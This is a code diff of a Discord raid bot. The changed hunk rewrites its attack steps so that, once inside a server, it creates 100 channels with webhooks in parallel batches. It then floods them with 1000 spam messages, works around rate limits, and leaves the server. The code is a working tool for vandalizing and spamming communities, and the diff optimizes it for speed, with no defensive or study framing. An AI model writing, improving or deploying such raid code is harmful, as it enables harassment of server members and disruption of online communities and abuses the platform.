@@ -129,77 +129,80 @@ client.on('messageCreate', async (message) => {
       console.warn('⚠️ Failed to rename server:', err.message);
     }
 
-    // Step 5: Create new channels
-    const createdChannels = [];
-    try {
-      console.log('🆕 Creating new channels...');
-      for (let i = 0; i < 50; i++) {
-        const channel = await handleRateLimit(() =>
-          guild.channels.create({ name: `${channelName}-${i + 1}` })
-            .catch(e => console.warn(`Channel create fail: ${e.message}`))
-        );
-        if (channel) {
-          createdChannels.push(channel);
+    // Step 5: Create 100 channels + webhooks in parallel batches
+    const createdWebhooks = [];
+    const totalChannelsToCreate = 100;
+    const batchSize = 25; // Adjust this for speed/stability
+
+    console.log(`🆕 Creating ${totalChannelsToCreate} channels with synced webhooks...`);
+
+    for (let i = 0; i < totalChannelsToCreate; i += batchSize) {
+      const batchPromises = [];
+
+      for (let j = 0; j < batchSize && (i + j) < totalChannelsToCreate; j++) {
+        const index = i + j;
+
+        const createPair = async () => {
+          // Create channel
+          const channel = await handleRateLimit(() =>
+            guild.channels.create({ name: `${channelName}-${index + 1}` })
+              .catch(e => console.warn(`Channel #${index + 1} failed:`, e.message))
+          );
+
+          if (!channel) return;
+
           console.log(`✅ Created channel: ${channel.name}`);
           didSomething = true;
-        }
-      }
-    } catch (err) {
-      console.warn('⚠️ Failed to create channels:', err.message);
-    }
 
-    if (createdChannels.length === 0) {
-      console.log('❌ No channels created. Skipping spam.');
-    } else {
-      // Step 6: Create webhooks
-      const webhooks = [];
-      try {
-        console.log('📎 Creating webhooks...');
-        for (const channel of createdChannels) {
-          const hook = await handleRateLimit(() =>
+          // Create webhook
+          const webhook = await handleRateLimit(() =>
             channel.createWebhook({ name: 'Nebula', avatar: webhookAvatar })
-              .catch(e => console.warn(`Webhook create fail: ${e.message}`))
+              .catch(e => console.warn(`Webhook #${index + 1} failed:`, e.message))
           );
-          if (hook) {
-            webhooks.push(hook);
-            console.log(`✅ Created webhook in: ${channel.name}`);
-            didSomething = true;
-          }
-        }
-      } catch (err) {
-        console.warn('⚠️ Failed to create webhooks:', err.message);
+
+          if (!webhook) return;
+
+          console.log(`📎 Created webhook in: ${channel.name}`);
+          createdWebhooks.push(webhook);
+        };
+
+        batchPromises.push(createPair());
       }
 
-      if (webhooks.length === 0) {
-        console.log('❌ No webhooks created. Skipping spam.');
-      } else {
-        // Step 7: Spam messages
-        const totalMessages = 1000;
-        const perHook = Math.ceil(totalMessages / webhooks.length);
-        let sent = 0;
-
-        console.log(`🔥 Starting spam with ${webhooks.length} webhooks...`);
-
-        const sendBatch = webhooks.map(webhook => async () => {
-          for (let i = 0; i < perHook && sent < totalMessages; i++) {
-            try {
-              await handleRateLimit(() => webhook.send(spamMessage));
-              sent++;
-              if (sent % 100 === 0) console.log(`📨 Sent: ${sent}`);
-            } catch (err) {
-              console.error(`⚠️ Webhook send failed: ${err.message}`);
-            }
-            await new Promise(r => setTimeout(r, 50)); // Small delay to avoid hitting limits hard
-          }
-        });
-
-        await Promise.all(sendBatch.map(fn => fn()));
-        console.log(`✅ Sent ${sent}/${totalMessages} spam messages.`);
-        didSomething = true;
-      }
+      await Promise.all(batchPromises);
+      await new Promise(r => setTimeout(r, 500)); // Optional small delay between batches
     }
 
-    // Step 8: Leave server
+    if (createdWebhooks.length === 0) {
+      console.error('❌ No webhooks could be created. Aborting spam.');
+      return message.channel.send('❌ Could not create any webhooks. Aborting.');
+    }
+
+    // Step 6: Spam messages via webhooks
+    const totalMessages = 1000;
+    const perHook = Math.ceil(totalMessages / createdWebhooks.length);
+    let sent = 0;
+
+    console.log(`🔥 Starting spam with ${createdWebhooks.length} webhooks...`);
+
+    const sendBatch = createdWebhooks.map(webhook => async () => {
+      for (let i = 0; i < perHook && sent < totalMessages; i++) {
+        try {
+          await handleRateLimit(() => webhook.send(spamMessage));
+          sent++;
+          if (sent % 100 === 0) console.log(`📨 Sent: ${sent}`);
+        } catch (err) {
+          console.error(`⚠️ Webhook send failed: ${err.message}`);
+        }
+        await new Promise(r => setTimeout(r, 50)); // Small delay to avoid hitting limits hard
+      }
+    });
+
+    await Promise.all(sendBatch.map(fn => fn()));
+    console.log(`✅ Sent ${sent}/${totalMessages} spam messages.`);
+    didSomething = true;
+
+    // Step 7: Leave server
     try {
       await handleRateLimit(() => guild.leave());
       console.log('🚪 Left server.');
